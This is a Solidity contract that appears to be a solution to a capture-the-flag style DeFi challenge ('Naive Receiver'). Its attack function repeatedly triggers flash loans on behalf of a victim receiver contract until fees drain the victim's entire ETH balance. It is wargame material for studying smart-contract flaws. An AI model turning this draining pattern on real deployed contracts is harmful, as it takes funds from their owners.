// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveAttacker {
    NaiveReceiverLenderPool naive;

    constructor(NaiveReceiverLenderPool _naive) {
        naive = _naive;
    }

    function attack(IERC3156FlashBorrower victim) external {
        while (address(victim).balance > 0) {
            naive.flashLoan(victim, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 1 ether, "");
        }
    }
}
